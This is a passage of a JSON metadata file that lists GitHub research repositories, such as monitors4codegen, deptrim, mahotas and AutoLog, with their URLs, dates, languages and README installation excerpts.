                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 18514
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Dockerfile",
                    "name": "Dockerfile",
                    "type": "Programming_language",
                    "size": 8771
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "R",
                    "name": "R",
                    "type": "Programming_language",
                    "size": 2303
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "204": {
        "filename": "microsoft_monitors4codegen_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/microsoft/monitors4codegen",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "We use the Python packages listed in [requirements.txt](requirements.txt). Our experiments used python 3.10. It is recommended to install the same with dependencies in an isolated virtual environment. To create a virtual environment using `venv`:\n```setup\npython3 -m venv venv_monitors4codegen\nsource venv_monitors4codegen/bin/activate\n```\nor using conda:\n```\nconda create -n monitors4codegen python=3.10\nconda activate monitors4codegen\n```\nFurther details and instructions on creation of python virtual environments can be found in the [official documentation](https://docs.python.org/3/library/venv.html). Further, we also refer users to [Miniconda](https://docs.conda.io/en/latest/miniconda.html), as an alternative to the above steps for creation of the virtual environment.\n\nTo install the requirements for running evaluations as described [below](#2-evaluation-scripts):\n\n```setup\npip3 install -r requirements.txt\n```\n",
                    "type": "Text_excerpt",
                    "original_header": "Environment Setup",
                    "parent_header": [
                        "Monitor-Guided Decoding of Code LMs with Static Analysis of Repository Context",
                        "2. Evaluation Scripts"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/microsoft/monitors4codegen/main/README.md"
            },
            {
                "result": {
                    "value": "To install `multilspy` using pip, execute the following command:\n```\npip install https://github.com/microsoft/multilspy/archive/main.zip\n```\n",
                    "type": "Text_excerpt",
                    "original_header": "Installation",
                    "parent_header": [
                        "Monitor-Guided Decoding of Code LMs with Static Analysis of Repository Context",
                        "4. `multilspy`"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/microsoft/monitors4codegen/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "The generated samples along with their compilation status, following the format described [above](#description-of-inference-results-csv-file-format), is available at [inference_results/dotprompts_results.csv](inference_results/dotprompts_results.csv). The file is stored using [git lfs](https://git-lfs.com/). If the file is not available locally after cloning this repository, please check the [git lfs website](https://git-lfs.com/) for instructions on setup, and clone the repository again after git lfs setup. \n",
                    "original_header": "3. Inference Results over DotPrompts"
                },
                "confidence": 0.9999856822685839,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/microsoft/monitors4codegen/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "This project may contain trademarks or logos for projects, products, or services. Authorized use of Microsoft \ntrademarks or logos is subject to and must follow \n[Microsoft's Trademark & Brand Guidelines](https://www.microsoft.com/en-us/legal/intellectualproperty/trademarks/usage/general).\nUse of Microsoft trademarks or logos in modified versions of this project must not cause confusion or imply Microsoft sponsorship.\nAny use of third-party trademarks or logos are subject to those third-party's policies.\n \n",
                    "original_header": "Trademarks"
                },
                "confidence": 0.9988852287322683,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/microsoft/monitors4codegen/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2023-11-04T21:49:04Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-10-01T05:58:31Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 562484
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "205": {
        "filename": "transaction-reverting-statements_Characterizing-require-statement-in-Ethereum-Smart-Contract_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/transaction-reverting-statements/Characterizing-require-statement-in-Ethereum-Smart-Contract",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2021-04-22T14:01:13Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-04-23T07:42:52Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Solidity",
                    "name": "Solidity",
                    "type": "Programming_language",
                    "size": 115271925
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "206": {
        "filename": "khaes-kth_simple-nngen_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/ASSERT-KTH/simple-nngen",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2019-12-11T18:17:55Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2023-04-05T07:40:49Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 8049
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Perl",
                    "name": "Perl",
                    "type": "Programming_language",
                    "size": 5208
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "207": {
        "filename": "m-zakeri_iust_deep_fuzz_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/m-zakeri/iust_deep_fuzz",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "You need Python 3.6.x and up-to-date TensorFlow and Keras frameworks on your computer.\n* Install [Python 3.6.x](https://www.python.org/)\n* Install [TensorFlow](https://www.tensorflow.org/)\n* Install [Keras](https://keras.io/)\n* Clone the IUST-DeepFuzz repository: `git clone https://github.com/m-zakeri/iust_deep_fuzz.git` or download the latest version https://github.com/m-zakeri/iust_deep_fuzz.git\n* IUST-DeepFuzz is almost ready for test data generation!\n",
                    "type": "Text_excerpt",
                    "original_header": "Install",
                    "parent_header": [
                        "IUST-DeepFuzz",
                        "Getting Started"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/m-zakeri/iust_deep_fuzz/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2018-03-19T22:09:05Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-08-10T14:44:43Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 287727
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "HTML",
                    "name": "HTML",
                    "type": "Programming_language",
                    "size": 132250
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Batchfile",
                    "name": "Batchfile",
                    "type": "Programming_language",
                    "size": 13606
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "C#",
                    "name": "C#",
                    "type": "Programming_language",
                    "size": 8077
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "208": {
        "filename": "BlueLionLogram_Logram_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/BlueLionLogram/Logram",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "Efficient Log Parsing Using n-Gram Dictionaries\nTo run the project in this repository, you need to create a TestLogs and Output folder under the project.\n \n",
                    "original_header": "Logram"
                },
                "confidence": 0.9511266577624368,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/BlueLionLogram/Logram/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2019-08-23T19:35:43Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-05-15T15:04:44Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 65252
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "209": {
        "filename": "castor-software_deptrim_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/ASSERT-KTH/deptrim",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "Prerequisites:\n\n- [Java OpenJDK 17](https://openjdk.java.net) or above\n- [Apache Maven](https://maven.apache.org/)\n\nIn a terminal, clone the repository and switch to the cloned folder:\n\n```bash\ngit clone https://github.com/castor-software/deptrim.git\ncd deptrim\n```\n\nThen run the following Maven command to build the application and install the plugin locally:\n\n```bash\nmvn clean install\n```\n",
                    "type": "Text_excerpt",
                    "original_header": "Installing and building from source",
                    "parent_header": [
                        "DepTrim <img src=\".img/logo.svg\" align=\"left\" height=\"135px\" alt=\"DepTrim logo\"/>"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/castor-software/deptrim/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "The `pom-specialized.xml` is created following these steps: \n",
                    "original_header": "How does DepTrim works?"
                },
                "confidence": 0.9693387139032118,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/castor-software/deptrim/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "<img src=\"https://github.com/castor-software/depclean/blob/master/.img/wasp.svg\" height=\"50px\" alt=\"Wallenberg Autonomous Systems and Software Program (WASP)\"/>\n \n",
                    "original_header": "Funding"
                },
                "confidence": 0.9934639464983258,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/castor-software/deptrim/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2022-09-20T19:47:02Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-09-29T08:31:10Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Java",
                    "name": "Java",
                    "type": "Programming_language",
                    "size": 58520
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "210": {
        "filename": "Biruk-Asmare_SANER22-Do-Developers-Refactor-Data-Access-Code_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/Biruk-Asmare/SANER22-Do-Developers-Refactor-Data-Access-Code",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2022-01-17T18:18:17Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2022-01-26T15:14:47Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Jupyter Notebook",
                    "name": "Jupyter Notebook",
                    "type": "Programming_language",
                    "size": 771207
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 2768
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "211": {
        "filename": "pmorvalho_C-Pack-IPAs_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/pmorvalho/C-Pack-IPAs",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2022-05-25T09:06:38Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-04-20T08:35:19Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "C",
                    "name": "C",
                    "type": "Programming_language",
                    "size": 4037819
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Makefile",
                    "name": "Makefile",
                    "type": "Programming_language",
                    "size": 4159
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "212": {
        "filename": "deib-polimi_deepthought_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/deib-polimi/deepthought",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2022-11-11T09:36:23Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-06-26T16:49:58Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Solidity",
                    "name": "Solidity",
                    "type": "Programming_language",
                    "size": 53870
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 48678
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "JavaScript",
                    "name": "JavaScript",
                    "type": "Programming_language",
                    "size": 737
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "213": {
        "filename": "hub-se_PAP_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/hub-se/PAP",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2023-01-30T08:26:00Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-03-20T09:50:13Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "C++",
                    "name": "C++",
                    "type": "Programming_language",
                    "size": 83518
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "214": {
        "filename": "logpai_AutoLog_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/logpai/AutoLog",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "**Sample:**\n```json\n{\"9E4C996176B68B9A5F521819A453BB91\": {\"templates\": [......, \n\"Resolved path is  <*> \",\n \"ACCESS CHECK:  this , doCheckOwner= <*> , ancestorAccess= <*> , parentAccess= <*> , access= <*> , subAccess= <*> , ignoreEmptyDir= <*> , resolveLink= <*> \",\n\"UnresolvedPathException  path:  <*>  preceding:  <*> count:  <*>  link:  <*>  target:  <*>  remainder:  <*> \",\n\"Could not get full path. Corresponding file might have deleted already.\",\n\"Could not get full path. Corresponding file might have deleted already.\"\n], \"label\": 1}\n```\n**Sample raw data:**\n```html\nINFO org.apache.hadoop.hdfs.server.namenode.FSNamesystem: HA Enabled:  <*> \nINFO org.apache.hadoop.hdfs.server.namenode.FSNamesystem: Append Enabled:  <*> \nINFO org.apache.hadoop.hdfs.server.namenode.FSDirectory: Caching file names occuring more than  <*>  times \nINFO org.apache.hadoop.hdfs.server.namenode.CacheManager: Using minimum value <*> for <*>\nWARN org.apache.hadoop.hdfs.server.namenode.FSNamesystem$SafeModeInfo: The threshold value should not be greater than , threshold:  <*> \nINFO org.apache.hadoop.hdfs.server.namenode.FSNamesystem$SafeModeInfo: dfs.namenode.safemode.threshold-pct =  <*> \nINFO org.apache.hadoop.hdfs.server.namenode.FSNamesystem$SafeModeInfo: dfs.namenode.safemode.min.datanodes =  <*> \nINFO org.apache.hadoop.hdfs.server.namenode.FSNamesystem$SafeModeInfo: dfs.namenode.safemode.extension     =  <*> \nINFO org.apache.hadoop.hdfs.server.namenode.NNConf: ACLs enabled?  <*> \n```\n \n",
                    "original_header": "Generated Datasets"
                },
                "confidence": 1.0,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/logpai/AutoLog/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "Instruction for running the callgraph generators\n```bash\njava -jar javacg-0.1-SNAPSHOT-static.jar lib1.jar ... > cg.txt\n```\nInstruction for pruning log-related call graphs\n```bash\npython generate_log_methods.py --cg cg.txt --output log_methods.csv --matcher 'log'\n```\nInstruction for getting logEP for log-related methods, , you can conduct path-level labelling for further anomaly detection.\n```bash\njava -jar LogEPGen.jar -j input_jar.jar -l log_methods.txt -o log_file.json\n```\n \nInstruction for the generated log sequences (without labelling):\n```bash\npython log_sequence_generator.py --call-graph-file cg.txt --log-file log_file.json --label-file log_methods.csv --output-path gen_log.txt --length 1000000\n```\n \n",
                    "original_header": "Execution"
                },
                "confidence": 0.9982023581631125,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/logpai/AutoLog/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2023-08-17T06:41:37Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-09-24T15:31:58Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Java",
                    "name": "Java",
                    "type": "Programming_language",
                    "size": 186410
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 8408
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "215": {
        "filename": "Hadhemii_ClonesInDLCode_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/Hadhemii/ClonesInDLCode",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "This folder contains the results of the manual classification of the selected 6 repositories commits. ",
                    "type": "Text_excerpt",
                    "original_header": "Manual Analysis",
                    "parent_header": [
                        "ClonesInDLCode",
                        "Folder Description",
                        "Data folder"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/Hadhemii/ClonesInDLCode/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2020-09-22T13:34:01Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2022-07-13T17:48:17Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Jupyter Notebook",
                    "name": "Jupyter Notebook",
                    "type": "Programming_language",
                    "size": 22075733
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 2438
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "216": {
        "filename": "clm07_UniASM_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/clm07/UniASM",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "```\npython bin2asm.py -i testdata\\bin\\elfedit-gcc-o0 -o testdata\\out-elfedit-gcc-o0\n``` \n",
                    "original_header": "1. Generate ASM files"
                },
                "confidence": 0.9906271384234127,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/clm07/UniASM/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2023-04-06T02:10:12Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-09-23T08:56:02Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 103562
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "217": {
        "filename": "luispedro_mahotas_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/luispedro/mahotas",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "If you are using [conda](https://anaconda.org/), you can install mahotas from\n[conda-forge](https://conda-forge.github.io/) using the following commands:\n\n```bash\nconda config --add channels conda-forge\nconda install mahotas\n```\n",
                    "type": "Text_excerpt",
                    "original_header": "Install",
                    "parent_header": [
                        "Mahotas"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/luispedro/mahotas/main/README.md"
            },
            {
                "result": {
                    "value": "You will need python (naturally), numpy, and a C++ compiler. Then you\nshould be able to use:\n\n```bash\npip install mahotas\n```\n\nYou can test your installation by running:\n\n```bash\npython -c \"import mahotas as mh; mh.test()\"\n```\n\nIf you run into issues, the manual has more [extensive documentation on\nmahotas\ninstallation](https://mahotas.readthedocs.io/en/latest/install.html),\nincluding how to find pre-built for several platforms.\n",
                    "type": "Text_excerpt",
                    "original_header": "Compilation from source",
                    "parent_header": [
                        "Mahotas",
                        "Install"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/luispedro/mahotas/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "You can set the `DEBUG` environment variable before compilation to get a\ndebug version:\n```bash\nexport DEBUG=1\npython setup.py test\n```\nYou can set it to the value `2` to get extra checks:\n```bash\nexport DEBUG=2\npython setup.py test\n```\n \nThe `Makefile` that is shipped with the source of mahotas can be useful\ntoo. `make debug` will create a debug build. `make fast` will create a\nnon-debug build (you need to `make clean` in between). `make test` will\nrun the test suite.\n \n",
                    "original_header": "Development"
                },
                "confidence": 0.9999768446398865,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/luispedro/mahotas/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "- Fix bug in Haralick features and NumPy 2 (thanks to @Czaki, see [#150](https://github.com/luispedro/mahotas/pull/150))\n \n",
                    "original_header": "Version 1.4.18 (Jul 18 2024)"
                },
                "confidence": 0.915729940183164,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/luispedro/mahotas/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "- Fix bug that stopped mahotas from working on Windows\n \n",
                    "original_header": "Version 1.4.17 (Jul 13 2024)"
                },
                "confidence": 0.995878487819367,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/luispedro/mahotas/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "- update for NumPy 2\n- Add deprecated warning for freeimage \n",
                    "original_header": "Version 1.4.16 (Jul 3 2024)"
                },
                "confidence": 0.99377000300729,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/luispedro/mahotas/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "- Update build system (thanks to @Czaki, see #147)\n \n",
                    "original_header": "Version 1.4.15 (Mar 24 2024)"
                },
                "confidence": 0.9920526737135964,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/luispedro/mahotas/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "- Fix code for C++17 (issue #146) \n",
                    "original_header": "Version 1.4.14 (Mar 24 2024)"
                },
                "confidence": 0.9328260784441005,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/luispedro/mahotas/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "- Fix freeimage testing (and make freeimage loading more robust, see #129)\n- Add GIL fixed (which triggered crashes in newer NumPy versions)\n \n",
                    "original_header": "Version 1.4.13 (Jun 28 2022)"
                },
                "confidence": 0.9999458699420978,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/luispedro/mahotas/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "- Update to newer NumPy\n- Build wheels for Python 3.9 & 3.10\n \n",
                    "original_header": "Version 1.4.12 (Oct 14 2021)"
                },
                "confidence": 0.999970123030918,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/luispedro/mahotas/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "- Build wheels automatically (PR #114 by [nathanhillyer](https://github.com/nathanhillyer))\n \n",
                    "original_header": "Version 1.4.10 (Jun 11 2020)"
                },
                "confidence": 0.9963411445665138,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/luispedro/mahotas/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "- Fix compilation on Windows\n \n",
                    "original_header": "Version 1.4.7 (Jul 10 2019)"
                },
                "confidence": 0.9754926039619221,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/luispedro/mahotas/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "- Upgrade code to newer NumPy API (issue #95)\n \n",
                    "original_header": "Version 1.4.5 (Oct 20 2018)"
                },
                "confidence": 0.9984512185882864,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/luispedro/mahotas/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "- Fix bug in Bernsen thresholding (issue #84)\n \n",
                    "original_header": "Version 1.4.4 (Nov 5 2017)"
                },
                "confidence": 0.9212411613482554,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/luispedro/mahotas/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "- Fix distribution (add missing `README.md` file)\n \n",
                    "original_header": "Version 1.4.3 (Oct 3 2016)"
                },
                "confidence": 0.9996030062889439,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/luispedro/mahotas/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "-   Add PIL based IO\n \n",
                    "original_header": "Version 1.2.4 (December 23 2014)"
                },
                "confidence": 0.9029959944597186,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/luispedro/mahotas/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "-   Explicitly set numpy.include\\_dirs() in setup.py [patch by Andrew\n    Stromnov]\n \n",
                    "original_header": "Version 1.2.1 (July 21 2014)"
                },
                "confidence": 0.9951016577073964,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/luispedro/mahotas/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "See the\n[ChangeLog](https://github.com/luispedro/mahotas/blob/master/ChangeLog)\nfor older version. \n",
                    "original_header": "1.1.0 (February 12 2014)"
                },
                "confidence": 0.9752121832242753,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/luispedro/mahotas/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2010-01-31T00:13:06Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-09-07T08:25:10Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 321916
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "C++",
                    "name": "C++",
                    "type": "Programming_language",
                    "size": 213804
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Makefile",
                    "name": "Makefile",
                    "type": "Programming_language",
                    "size": 723
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "218": {
        "filename": "antoineBarbez_CAME_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/antoineBarbez/CAME",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2018-11-07T00:24:07Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
